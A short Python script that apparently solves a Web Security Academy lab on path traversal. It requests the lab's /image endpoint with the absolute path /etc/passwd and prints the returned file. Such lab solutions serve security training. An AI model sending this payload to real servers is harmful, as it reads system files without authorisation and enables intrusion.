# Lab: File path traversal, traversal sequences blocked with absolute path bypass
# difficulty: practitioner

import requests

sub = '0a1d003404860ce981aeb7e70059009b'
url = f'https://{sub}.web-security-academy.net'

def main():
    params = {'filename': '/etc/passwd'}
    
    endpoint = '/image'
    r = requests.get(url + endpoint, params=params)
    print(r.text)

if __name__ == '__main__':
    main()